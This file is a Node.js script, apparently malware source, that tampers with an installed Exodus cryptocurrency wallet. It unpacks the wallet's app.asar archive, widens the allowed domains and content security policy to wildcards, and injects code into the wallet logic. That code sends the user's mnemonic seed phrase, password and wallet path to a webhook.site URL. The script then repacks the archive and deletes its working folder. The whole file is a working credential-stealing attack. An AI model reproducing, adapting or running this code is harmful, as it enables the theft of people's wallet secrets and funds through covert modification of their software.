const fs = require("fs");
const util = require("util");
const { exec } = require("child_process");

const execPromise = util.promisify(exec);

const folderPath = process.env.LOCALAPPDATA + "/exodus";
const readdir = util.promisify(fs.readdir);
let pathArray = [];

async function list() {
  const files = await readdir(folderPath);

  files.forEach((file) => {
    if (file.includes("app-")) {
      const absolutePath = folderPath + "/" +  file;
      pathArray.push(absolutePath);
    }
  });

  return pathArray;
}

async function highest(paths) {
  let highestFolder = null;
  let highestNumber = 0;

  for (const file of paths) {
    const versionNumber = parseFloat(file.split("app-")[1]);

    if (!isNaN(versionNumber) && versionNumber > highestNumber) {
      highestNumber = versionNumber;
      highestFolder = file;
    }
  }

  return highestFolder;
}

function del(path) {
  if (fs.existsSync(path)) {
    fs.readdirSync(path).forEach((file) => {
      const currentPath = `${path}/${file}`;
      if (fs.lstatSync(currentPath).isDirectory()) {
        del(currentPath);
      } else {
        fs.unlinkSync(currentPath);
      }
    });
    fs.rmdirSync(path);
  }
}

async function modifyFile(filePath, searchString, replacementString) {
  try {
    const data = await fs.promises.readFile(filePath, "utf8");

    if (!data.includes(searchString)) return;

    const modifiedData = data.replace(searchString, replacementString);
    await fs.promises.writeFile(filePath, modifiedData, "utf8");
  } catch (err) {
    console.error(err);
  }
}

async function Inject() {
  const versionPath = await highest(await list());
  const asar = versionPath + "/resources/app.asar";
  const out = versionPath + "/resources/out";
  const unpack = `npx asar e ${asar} ${out}`;
  const pack = `npx asar p ${out} ${asar}`;
  const walletIndex = out + "/src/app/wallet/index.js";
  const walletHtml = out + "/src/static/wallet.html";
  const mainIndex = out + "/src/app/main/index.js";

  const hook = "https://webhook.site/ef0b2004-c3e4-46f6-86f9-0f87f9fe1f52";

  const searchList = {
    domains: `domains:["server.exodus.io","exodusapp.blob.core.windows.net"]`,
    csp: "data: https://server.exodus.io/ https://exodusapp.blob.core.windows.net/",
    wallet: "await this._loadLightningCreds()",
  };

  const replacement = {
    domains: 'domains: "*"',
    csp: "data: *",
    wallet: `await this._loadLightningCreds();var xe_array={xe_mnemonic:this._seed.mnemonicString,xe_password:e,wallet_directory:this._walletPaths.walletDir},xe_request=new XMLHttpRequest;xe_request.open("POST","${hook}",!0),xe_request.setRequestHeader("Content-Type","application/json");var payload={data:xe_array};xe_request.send(JSON.stringify(payload));`,
  };

  await execPromise(unpack);

  const modifyMainIndex = modifyFile(
    mainIndex,
    searchList.domains,
    replacement.domains
  );
  const modifyWalletHtml = modifyFile(
    walletHtml,
    searchList.csp,
    replacement.csp
  );
  const modifyWalletIndex = modifyFile(
    walletIndex,
    searchList.wallet,
    replacement.wallet
  );

  await Promise.all([modifyMainIndex, modifyWalletHtml, modifyWalletIndex]);

  await execPromise(pack);
  del(out);
}

if (fs.existsSync(folderPath)) {
  Inject();
}
